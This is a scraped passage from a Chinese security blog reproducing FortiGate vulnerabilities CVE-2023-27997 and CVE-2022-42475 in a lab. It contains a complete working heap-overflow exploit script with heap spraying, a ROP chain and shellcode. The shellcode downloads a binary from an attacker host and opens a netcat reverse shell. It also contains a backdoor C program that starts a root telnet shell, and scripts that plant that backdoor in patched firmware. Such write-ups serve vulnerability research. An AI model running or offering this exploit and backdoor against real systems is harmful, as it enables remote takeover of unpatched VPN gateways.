为了保证堆块大小&amp;lt;payloadLength&amp;lt;in_len-5从而触发堆溢出，定义payloadLength大小为0x1f00&lt;br&gt;
发送的data长度控制在0x1000-0x18-0x7，0x18为jemalloc分配堆块的标头长度，0x7为4字节seed+2字节size+1字节终止符，gdb跟踪一下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl
from pwn import *
from hashlib import md5


ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443


path = &amp;quot;/remote/hostcheck_validate&amp;quot;.encode()


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _default_context.options |= ssl.OP_NO_TLSv1_3
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


def get_salt():
    sk = create_ssl_ctx()
    sk.sendall(b&amp;quot;GET /remote/info HTTP/1.1\r\nHost:&amp;quot;+ip.encode()+b&amp;quot;\r\n\r\n&amp;quot;)
    data = sk.recv(1024)
    # print(data)
    sk.close()
    salt = data[data.find(b&amp;quot;salt=&amp;quot;)+6:data.find(b&amp;quot;salt=&amp;quot;)+14]
    info(&amp;quot;salt: &amp;quot;+str(salt))
    return salt


def gen_ks(salt, seed, size):
    magic = b&#39;GCC is the GNU Compiler Collection.&#39;
    k0 = md5(salt+seed+magic).digest()
    keystream = k0
    while len(keystream) &amp;lt; size:
        k0 = md5(k0).digest()
        keystream += k0
    return keystream[:size]


def gen_enc_data(salt, seed, size, data):
    plaintext = struct.pack(&amp;quot;&amp;lt;H&amp;quot;, size) + data
    keystream = gen_ks(salt, seed, len(plaintext))
    ciphertext = bytes(x[0] ^ x[1] for x in zip(plaintext, keystream)).hex()
    return seed.decode()+ciphertext


socks = []

# get_salt()

_sk = create_ssl_ctx()

payload = b&amp;quot;enc=&amp;quot;+gen_enc_data(get_salt(),
                               b&#39;deadbeef&#39;, 0x1f00, b&#39;A&#39;*(0x1000-0x18-7)).encode()
rq = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
    str(len(payload)).encode() + \
    b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&amp;quot;+payload

print(rq)

_sk.sendall(rq)

response = _sk.recv(1024)
print(response)

_sk.close()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;验证了最开始传进来的in_len即&lt;code&gt;enc=&lt;/code&gt;后的keystream长度&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240827155703.png&#34; alt=&#34;Pasted image 20240827155703.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
跟进到&lt;code&gt;fsv_malloc&lt;/code&gt;处，rsi通过移位+1操作以及变为0xfe8&lt;br&gt;
然后将enc字段中的字符串每2字节组成一个十六进制字节存入&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;pwndbg&amp;gt; x/10gx 0x7f146c302018
0x7f146c302018: 0x6665656264616564      0x6437316561396532
0x7f146c302028: 0x3432623766346433      0x3065356531616161
0x7f146c302038: 0x6565653262653862      0x3734363738343436
0x7f146c302048: 0x3562623530356363      0x3535396430383531
0x7f146c302058: 0x6365636632396136      0x3238656537393536
pwndbg&amp;gt; x/10gx 0x7f146c2f3018
0x7f146c2f3018: 0x7de19a2eefbeadde      0xe0e5a1aa247b4f3d
0x7f146c2f3028: 0x47764864ee2eebb8      0x55d98015b55b50cc
0x7f146c2f3038: 0x82ee9765ecfc926a      0x6a0252dd8edeb094
0x7f146c2f3048: 0x069d945198969402      0x2d92992b0498576c
0x7f146c2f3058: 0xa90995f0ee049316      0x6568631231fde5d8
pwndbg&amp;gt; x/10bs 0x7f146c302018
0x7f146c302018: &amp;quot;deadbeef2e9ae17d3d4f7b24aaa1e5e0b8eb2eee64487647cc505bb51580d9556a92fcec6597ee8294b0de8edd52026a0294969851949d066c5798042b99922d169304eef09509a9d8e5fd311295c1d20b1cd41fa5315cdf9cda14447ab341f6e1c3d1bf&amp;quot;...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;分配堆块位于&lt;code&gt;0x7f146c2f3000&lt;/code&gt;处，大小0x1000 bytes&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;pwndbg&amp;gt; x/10gx 0x7f146c2f3000
0x7f146c2f3000: 0x00007f146c2f4000      0x0000000000000000
0x7f146c2f3010: 0x00007f146c2f4000      0x7de19a2eefbeadde
0x7f146c2f3020: 0xe0e5a1aa247b4f3d      0x47764864ee2eebb8
0x7f146c2f3030: 0x55d98015b55b50cc      0x82ee9765ecfc926a
0x7f146c2f3040: 0x6a0252dd8edeb094      0x069d945198969402
pwndbg&amp;gt; dist 0x7f146c2f3000 0x00007f146c2f4000
0x7f146c2f3000-&amp;gt;0x7f146c2f4000 is 0x1000 bytes (0x200 words)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用:&lt;/h2&gt;
&lt;h3 id=&#34;堆排布&#34;&gt;堆排布:&lt;/h3&gt;
&lt;p&gt;断点下在&lt;code&gt;SSL_new&lt;/code&gt;之后单步前进，到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;   0x7f147197eb41     call   CRYPTO_zalloc@plt                &amp;lt;CRYPTO_zalloc@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看可知7.2.1版本分配的ssl结构体大小为0x1db8&lt;br&gt;
根据lexfo博客中的思路，我们还是选择堆喷覆盖&lt;code&gt;handshake_func&lt;/code&gt;:&lt;br&gt;
https://blog.lexfo.fr/xortigate-cve-2023-27997.html&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;注意堆喷需要在一次ssl请求中完成，请求完成后会释放，会写入的数据清0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以7.2.1为例，以下为堆喷步骤:&lt;br&gt;
1. 创建大量的socket连接，填充buffer&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151000.png&#34; alt=&#34;Pasted image 20240830151000.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2. 在其中一个socket连接发送大量数据，使http请求的buffer重新分配&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151051.png&#34; alt=&#34;Pasted image 20240830151051.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
3. 建立含payload的socket连接get_salt并发送，该socket会被分配到刚才free掉的buffer，此时堆溢出写结构体指针&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151308.png&#34; alt=&#34;Pasted image 20240830151308.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
4. 其余socket连接发送data，触发函数指针引用&lt;/p&gt;
&lt;p&gt;这里改了用了一个原生gdb的logging功能，打印存放keystream的地址（和存放HTTP请求的地址相邻，差0x18），以及分配ssl结构体的地址&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;target remote 192.168.122.99:23
set height 0
set pagination off
set disassembly-flavor intel
handle SIGPIPE nostop
shell rm -f ssl_chunk.txt ssl_obj.txt je_malloc.txt keystream.txt

# break after allocating the buffer grab the address
# b *0x01776baa
# commands
#     set logging file ssl_chunk.txt
#     set logging enable on
#     set $heap_obj = $rax
#     printf &amp;quot;buffer: %p\n&amp;quot;, $heap_obj
#     set logging enable off
#     c
# end
# print address of SSL objects when malloc&#39;d
b *CRYPTO_zalloc+37 if  ( $r12 == 0x1db8 )
commands
    set logging file ssl_obj.txt
    set logging enable on
    printf &amp;quot;CRYPTO_zalloc(0x%x) = %p\n&amp;quot;, $r12, $rax
    set logging enable off
    c
end

# break in je_malloc in case something calls je_malloc directly
b *0x1776baa if (($r13 ==0x2000))
commands
    set logging file je_malloc.txt
    set logging enable on
    printf &amp;quot;je_malloc(0x%x) = %p\n&amp;quot;, $r13 , $rax
    set logging enable off
    c
end

b *0x16adf15 
commands
    set logging file keystream.txt
    set logging enable on
    printf &amp;quot;keystream_loc = %p\n&amp;quot; , $rdx
    set logging enable off
    c
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如图，我们在堆上喷射大量socket buffer后能够溢出到其中某一个ssl结构体，修改handshake函数指针并覆盖in_init为1，劫持执行流&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151740.png&#34; alt=&#34;Pasted image 20240830151740.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240901233231.png&#34; alt=&#34;Pasted image 20240901233231.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;payload构造&#34;&gt;payload构造:&lt;/h3&gt;
&lt;p&gt;此刻&lt;code&gt;$rdi,$rbp&lt;/code&gt;指向ssl结构体开头，由于ssl结构体存在不可写区域，我们可以利用以下gadget将栈迁移到out buffer进行rop&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;push_rdi_pop_rsp_ret = 0x98bed1
# 0x000000000098bed1 : push rdi ; pop rsp ; ret 栈迁移到ssl结构体起始地址

add_rsp_0xb8_pop_rbx_rbp_ret = 0x2a49fa3
# 0x0000000002a49fa3 : add rsp, 0xb8 ; pop rbx ; pop rbp ; ret

pop_rax_rdx_ret = 0x60bda4
# 0x000000000060bda4 : pop rax ; pop rdx ; ret 8字节padding rax , rdx为ssl_offset

mov_rax_rdi_sub_rax_rdx_ret = 0x14bd8cf
# 0x00000000014bd8cf : mov rax, rdi ; sub rax, rdx ; ret 取ssl结构体起始地址给rax并减去rdx，使rax指向out区域

push_rax_pop_rsp_ret = 0xe72240
# 0x0000000000e72240 : push rax ; pop rsp ; xor eax, eax ; ret  迁栈到out区域
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240902163611.png&#34; alt=&#34;Pasted image 20240902163611.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
这里最后采用的是ret2mprotect然后跳转执行shellcode，执行&lt;code&gt;execlp(&amp;quot;/bin/node&amp;quot;,&amp;quot;node&amp;quot;,&amp;quot;-e&amp;quot;,&amp;quot;...&amp;quot;,NULL)&lt;/code&gt;，即通过fortios自带的&lt;code&gt;/bin/node&lt;/code&gt;程序执行后门下载以及反弹shell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from hashlib import md5
from pwn import *
import requests
import time
import ssl
import socket
context.os = &#39;linux&#39;
context.arch = &#39;amd64&#39;

ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443

path = &amp;quot;/remote/hostcheck_validate&amp;quot;.encode()


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _default_context.options |= ssl.OP_NO_TLSv1_3
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


def get_salt(sk):
    sk.sendall(b&amp;quot;GET /remote/info HTTP/1.1\r\nHost:&amp;quot;+ip.encode()+b&amp;quot;\r\n\r\n&amp;quot;)
    data = sk.recv(1024)
    # print(data)
    # sk.close()
    salt = data[data.find(b&amp;quot;salt=&amp;quot;)+6:data.find(b&amp;quot;salt=&amp;quot;)+14]
    info(&amp;quot;salt: &amp;quot;+str(salt))
    return salt


def gen_ks(salt, seed, size):
    magic = b&#39;GCC is the GNU Compiler Collection.&#39;
    k0 = md5(salt+seed+magic).digest()
    keystream = k0
    while len(keystream) &amp;lt; size:
        k0 = md5(k0).digest()
        keystream += k0
    return keystream[:size]


def gen_enc_data(salt, seed, size, data):
    plaintext = p16(size) + data
    keystream = gen_ks(salt, seed, len(plaintext))
    ciphertext = xor(plaintext, keystream).hex()
    return seed + ciphertext.encode()


def gen_seed_for_offset(salt, offset, value):
    for i in range(0xffffff):
        seed = &amp;quot;00{0:06x}&amp;quot;.format(i).encode()
        ks = gen_ks(salt, seed, offset+1)
        if int(ks[offset]) == int(value):
            print(&amp;quot;seed found: &amp;quot;+str(seed))
            print(&amp;quot;keystream: &amp;quot;+hex(ks[offset]))
            print(&amp;quot;value: &amp;quot;+str(value))
            print(&amp;quot;offset: &amp;quot;+str(offset))
            return seed
    print(&amp;quot;keystream not found&amp;quot;)
    exit(1)


def gen_seeds_u8(salt, offset, val):
    value = p8(val)
    if val == 0:
        return [(b&#39;00bfbfbf&#39;, offset - 1), (b&#39;00bfbfbf&#39;, offset - 1)]
    s = gen_seed_for_offset(salt, offset, value[0])
    return [(s, offset - 2), (s, offset - 1)]


def gen_seeds_u64(salt, offset, val):
    value = p64(val)
    seeds = []
    n = 7
    for i in range(n, -1, -1):
        if value[i] != 0:
            s = gen_seed_for_offset(salt, offset + i, value[i])
            seeds.append((s, offset + i - 1))
            seeds.append((s, offset + i - 2))
        else:
            seeds.append((b&#39;00bfbfbf&#39;, offset + i - 1))
            seeds.append((b&#39;00bfbfbf&#39;, offset + i - 1))
    return seeds[::-1]


def gen_payload():
    # 0x15ea350  call _execlp
    shellcode = asm(&#39;&#39;&#39;
    lea rdi, [rip+arg1]
    lea rsi, [rip+arg2]
    lea rdx, [rip+arg3]
    lea rcx, [rip+arg4]
    mov r8, 0x0
    mov rax, 0x15ea350
    jmp rax

arg1:
    .string &amp;quot;/bin/node&amp;quot;

arg2:
    .string &amp;quot;node&amp;quot;
    
arg3:
    .string &amp;quot;-e&amp;quot;

arg4:
    .string &amp;quot;const http=require(&#39;http&#39;);const fs=require(&#39;fs&#39;);const {spawn}=require(&#39;child_process&#39;);const fileUrl=&#39;http://192.168.122.128:8000/busybox&#39;;const args=[&#39;nc&#39;, &#39;192.168.122.128&#39;, &#39;1234&#39;, &#39;-e&#39;, &#39;/bin/busybox&#39;, &#39;ash&#39;];const command=&#39;/bin/busybox&#39;;const create=(err) =&amp;gt; {console.log(&#39;i&#39;);};try {fs.chmod(&#39;/bin/busybox&#39;, 0o777, (err) =&amp;gt; {});} catch (err) {};try {fs.symlinkSync(&#39;/bin/busybox&#39;, &#39;/bin/nc&#39;);} catch (err) {};try {fs.unlink(&#39;/bin/nc&#39;, (err)=&amp;gt;{fs.unlink(&#39;/bin/ash&#39;, (err) =&amp;gt; {fs.symlinkSync(&#39;/bin/busybox&#39;, &#39;/bin/ash&#39;);});})}catch (err){};process.on(&#39;uncaughtException&#39;, create);const df=(url, dest) =&amp;gt; {const file=fs.createWriteStream(dest);http.get(url, (response) =&amp;gt; {response.pipe(file);file.on(&#39;finish&#39;, () =&amp;gt; {file.close(() =&amp;gt; {create();});});}).on(&#39;error&#39;, (err) =&amp;gt; {});};const executeFile=(err) =&amp;gt; {const child=spawn(command,args, {stdio: &#39;inherit&#39; });};df(fileUrl, &#39;/bin/busybox&#39;);console.log(&#39;d&#39;);create();executeFile();&amp;quot;
                    &#39;&#39;&#39;)

    push_rsp_pop_rcx_ret = 0x805b38
    # 0x0000000000805b38 : push rsp ; pop rcx ; ret 修改rcx为当前栈指针

    push_rcx_pop_rdx_ret = 0x12ce92b
    # 0x00000000012ce92b : push rcx ; pop rdx ; ret 修改rdx为栈指针

    pop_rax_ret = 0x46bb27
    # 0x000000000046bb27 : pop rax ; ret 页偏移rax 0x26?

    sub_rdx_rax_mov_rax_rdx_ret = 0x285a384
    # 0x000000000285a384 : sub rdx, rax ; mov rax, rdx ; ret rdx减去页偏移

    push_rdx_pop_rdi_ret = 0x257008a
    # 0x000000000257008a : push rdx ; pop rdi ; ret 修改rdi为栈指针

    pop_rsi_ret = 0x530c8e
    # 0x0000000000530c8e : pop rsi ; ret 内存块大小

    pop_rdx_ret = 0x509372
    # 0x0000000000509372 : pop rdx ; ret prot位

    mprotect_addr = 0x43f3d0

    add_rax_rdi_ret = 0x7d4f3d
    # 0x00000000007d4f3d : add rax, rdi ; ret

    push_rax_ret = 0x43dccc
    # 0x000000000043dccc : push rax ; ret

    payload = p64(0)
    payload += p64(push_rsp_pop_rcx_ret)
    payload += p64(push_rcx_pop_rdx_ret)
    payload += p64(pop_rax_ret)
    payload += p64(0x2e+0x7e000)
    payload += p64(sub_rdx_rax_mov_rax_rdx_ret)
    payload += p64(push_rdx_pop_rdi_ret)
    payload += p64(pop_rsi_ret)
    payload += p64(0x300000)
    payload += p64(pop_rdx_ret)
    payload += p64(7)
    payload += p64(mprotect_addr)
    # payload += p64(0xdeadbeef)
    payload += p64(pop_rax_ret)
    payload += p64(0x15e+0x7e000)
    payload += p64(add_rax_rdi_ret)
    payload += p64(push_rax_ret)
    payload = payload.ljust(0x150, b&amp;quot;\x90&amp;quot;)
    payload += shellcode

    return payload.ljust(0x2000-0x18-7, b&amp;quot;A&amp;quot;)


def send_payload(_sk, salt, seed, size, data=b&#39;&#39;):
    payload = b&amp;quot;enc=&amp;quot;+gen_enc_data(salt, seed, size, data)
    rq = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: &amp;quot;+ip.encode()+b&amp;quot;\r\nContent-Length: &amp;quot; + \
        str(len(payload)).encode() + \
        b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n&amp;quot;+payload
    _sk.sendall(rq)
    # _sk.recv(1024)


tick = 33

while True:
    tick += 1
    try:
        socks = []

        for i in range(tick):
            sk = create_ssl_ctx()
            data = b&amp;quot;POST &amp;quot; + b&amp;quot;/remote/login&amp;quot; + \
                b&amp;quot; HTTP/1.1\r\nHost: &amp;quot;+ip.encode()+b&amp;quot;\r\nContent-Length: 3\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\na=1&amp;quot;
            sk.sendall(data)
            socks.append(sk)

        socks[-1].send(b&amp;quot;B&amp;quot;*0x2001)

        _sk = create_ssl_ctx()
        salt = get_salt(_sk)

        ssl_offset = 0x2000-0x1e+2
        handshake_func = ssl_offset + 0x30
        in_init = ssl_offset+0x64

        seed = []

        push_rdi_pop_rsp_ret = 0x98bed1
        # 0x000000000098bed1 : push rdi ; pop rsp ; ret 栈迁移到ssl结构体起始地址

        add_rsp_0xb8_pop_rbx_rbp_ret = 0x2a49fa3
        # 0x0000000002a49fa3 : add rsp, 0xb8 ; pop rbx ; pop rbp ; ret

        pop_rax_rdx_ret = 0x60bda4
        # 0x000000000060bda4 : pop rax ; pop rdx ; ret 8字节padding rax , rdx为ssl_offset

        mov_rax_rdi_sub_rax_rdx_ret = 0x14bd8cf
        # 0x00000000014bd8cf : mov rax, rdi ; sub rax, rdx ; ret 取ssl结构体起始地址给rax并减去rdx，使rax指向out区域

        push_rax_pop_rsp_ret = 0xe72240
        # 0x0000000000e72240 : push rax ; pop rsp ; xor eax, eax ; ret  迁栈到out区域

        seed.extend(gen_seeds_u64(salt, handshake_func, push_rdi_pop_rsp_ret))
        seed.extend(gen_seeds_u64(salt, ssl_offset, pop_rax_rdx_ret))
        seed.extend(gen_seeds_u64(salt, ssl_offset+0x10, ssl_offset-2-8))
        seed.extend(gen_seeds_u64(salt, ssl_offset +
                    0x18, mov_rax_rdi_sub_rax_rdx_ret))
        seed.extend(gen_seeds_u64(salt, ssl_offset+0x20, push_rax_pop_rsp_ret))

        # seed.extend(gen_seeds_u64(salt, handshake_func, 0xdeadbeefdeadbeef))
        seed.extend(gen_seeds_u8(salt, in_init, 1))

        for i in seed:
            print(i)
            send_payload(_sk, salt, i[0], i[1], gen_payload())
            # send_payload(_sk, salt, i[0], i[1],
            #              b&#39;\x00&#39;*8 + p64(0xdeadbeef) + b&#39;A&#39;*(0x2000-0x18-7-8-8))

        counter = 0
        for i in socks:
            print(counter)
            counter += 1
            i.send(b&amp;quot;a&amp;quot;*0x40)

    except Exception as e:
        print(f&amp;quot;crash: {e}&amp;quot;)
        _sk.close()
        break

&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/27997.gif&#34; alt=&#34;27997.gif&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">CVE-2023-27997 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/PjuPrWzmI/"" data-c="
          &lt;p&gt;本文复现CVE-2022-42475，版本v7.2.1.F-build1254&lt;/p&gt;
&lt;h2 id=&#34;下载链接&#34;&gt;下载链接:&lt;/h2&gt;
&lt;p&gt;https://github.com/hegdepavankumar/Cisco-Images-for-GNS3-and-EVE-NG&lt;/p&gt;
&lt;h2 id=&#34;license&#34;&gt;license :&lt;/h2&gt;
&lt;p&gt;https://github.com/rrrrrrri/fgt-gadgets&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 运行python3 license_old.py生成后前台设置时导入即可
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240806175558.png&#34; alt=&#34;Pasted image 20240806175558.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;新版：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 导入ovf，启动后初始化虚拟机，默认用户名admin，默认密码空
2. 初始化完成后关机，在虚拟机目录下有fo-disk1.vmdk生成
3. 将vmdk挂载到另外一个虚拟机中
4. 新版执行`python3 decrypt.py -f rootfs.gz -k flatkc`解密rootfs.gz
5. root权限解压rootfs.gz和bin.tar.xz
	```
	   gzip -d ./dec.gz
       mkdir rootfs
       cd rootfs &amp;amp;&amp;amp; mv ../dec ./
       sudo su
       cpio -idmv &amp;lt; ./dec
       rm -rf ./dec
       xz -d ./bin.tar.xz &amp;amp;&amp;amp; tar -xvf ./bin.tar &amp;amp;&amp;amp; rm -rf ./bin.tar
       cd .. &amp;amp;&amp;amp; mv ./rootfs/bin/init ./
	```
	
6. `python3 patch.py init` patch init文件
7. 重打包
	```
	   chmod 755 ./init.patched &amp;amp;&amp;amp; mv ./init.patched ./rootfs/bin/init
       cd rootfs
       tar -cvf bin.tar bin &amp;amp;&amp;amp; xz bin.tar &amp;amp;&amp;amp; rm -rf bin
       find . | cpio -H newc -o &amp;gt; ../rootfs.raw &amp;amp;&amp;amp; cd ..
       cat ./rootfs.raw | gzip &amp;gt; rootfs.gz
    ```
    
8. &#39;python3 patch.py flatkc&#39; patch flatkc
9. 替换掉vmdisk的rootfs.gz和flatkc
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;网络配置&#34;&gt;网络配置：&lt;/h2&gt;
&lt;p&gt;https://blog.csdn.net/meigang2012/article/details/87903878&lt;br&gt;
https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#配置port和ip
config system interface
edit port1
set mode static
set ip 192.168.122.99 255.255.255.0
set allowaccess ping https ssh http telnet
end

#配置网关
config router static
edit 1
set device port1
set gateway 192.168.122.128
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;VMware网络适配器设置为NAT，虚拟网络编辑器修改子网ip&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240807100542.png&#34; alt=&#34;Pasted image 20240807100542.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
进入后台后前往System/Settings修改&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240806175558.png&#34; alt=&#34;Pasted image 20240806175558.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
VPN/SSL-VPN门户&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814105739.png&#34; alt=&#34;Pasted image 20240814105739.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;SSL-VPN设置&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240812101642.png&#34; alt=&#34;Pasted image 20240812101642.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;配置sslvpn的防火墙策略&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814105636.png&#34; alt=&#34;Pasted image 20240814105636.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;patch&#34;&gt;Patch：&lt;/h2&gt;
&lt;h3 id=&#34;固件解包后门植入&#34;&gt;固件解包&amp;amp;&amp;amp;后门植入：&lt;/h3&gt;
&lt;p&gt;替换原版/bin/sh软链接为功能齐全的预编译busybox&lt;br&gt;
传入预编译的gdbserver方便调试&lt;br&gt;
将/bin/smartctl替换为开启telnet的后门，执行&lt;code&gt;diagnose hardware smartctl&lt;/code&gt;触发&lt;br&gt;
后门backdoor.c:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// gcc -s backdoor.c -o backdoor
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

void shell()
{
    system(&amp;quot;/bin/busybox ls&amp;quot;);
    system(&amp;quot;/bin/busybox id&amp;quot;);
    system(&amp;quot;/bin/busybox killall sshd &amp;amp;&amp;amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&amp;quot;);
    system(&amp;quot;/bin/busybox ash --login -s&amp;quot;);
    return;
}

int main(int argc, char const *argv[])
{
    shell();
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;文件系统存在于gzip压缩的cpio中&lt;br&gt;
其中fs中的.tar.xz的压缩包由fortigate魔改加密，需使用sbin/目录下的elf解压缩&lt;br&gt;
下面给出提取及后门植入脚本，替换文件需跟脚本同一目录，root权限下执行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
echo &amp;quot;请将backdoor,busybox,gdbserver置于与脚本同一目录下&amp;quot;
chmod +x $PWD/*
mkdir -p $PWD/fs
cp /media/fk/FORTIOS/rootfs.gz $PWD
gzip -d rootfs.gz
cd $PWD/fs
cpio -idmv &amp;lt; ../rootfs
chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
chroot . /sbin/ftar -xf /bin.tar
chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz
chroot . /sbin/ftar -xf /migadmin.tar
chroot . /sbin/xz --check=sha256 -d /usr.tar.xz
chroot . /sbin/ftar -xf /usr.tar
cp ../backdoor bin/smartctl 
cp ../busybox bin/busybox 
cp ../gdbserver* bin/gdbserver
chmod +777 bin/smartctl
chmod +777 bin/busybox
chmod +777 bin/gdbserver
rm bin/sh
ln -sn /bin/busybox bin/sh
echo &amp;quot;手动patch init...&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;patch init后：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
echo &amp;quot;请将init置于与脚本同一目录下&amp;quot;
sudo cp init fs/bin/init
cd fs
find . | cpio -H newc -o &amp;gt; ../rootfs.raw
cd ..
cat ./rootfs.raw | gzip &amp;gt; rootfs.gz
rm rootfs.raw &amp;amp;&amp;amp; rm rootfs
chmod -R 777 rootfs.gz
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者使用这里的auto-repack脚本:&lt;br&gt;
https://github.com/rrrrrrri/fgt-auto-repack/blob/main/automatic_repack.py&lt;/p&gt;
&lt;p&gt;fo.vmx修改开启debugStub&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;debugStub.listen.guest64 = &amp;quot;TRUE&amp;quot;
debugStub.listen.guest64.remote = &amp;quot;TRUE&amp;quot;
debugStub.port.guest64 = &amp;quot;12345&amp;quot;
debugStub.listen.guest32 = &amp;quot;TRUE&amp;quot;
debugStub.listen.guest32.remote = &amp;quot;TRUE&amp;quot;
debugStub.port.guest32 = &amp;quot;12346&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;启动逻辑&#34;&gt;启动逻辑:&lt;/h3&gt;
&lt;p&gt;使用vmlinux-to-elf将内核flatkc转为elf分析一下启动逻辑&lt;/p&gt;
&lt;p&gt;flatkc-&amp;gt;/sbin/init-&amp;gt;/bin/init&lt;/p&gt;
&lt;p&gt;flatkc的init_post中fgt_verify有对文件哈希等等的检测&lt;br&gt;
如果不能通过fgt_verify检测会启动/sbin/init&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240807155305.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;而/sbin/init会解压文件系统中的tar.xz压缩包&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240807153418.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
为了防止之前解压patch的文件被覆盖，我们需要绕过/sbin/init的执行&lt;br&gt;
有两种patch方式&lt;br&gt;
第一种便是启动vm的debug在启动时更改寄存器的值进而修改启动进程&lt;br&gt;
第二种patch 内核elf后转回内核文件 (暂未验证:https://wzt.ac.cn/2024/04/02/fortigate_debug_env2/)&lt;/p&gt;
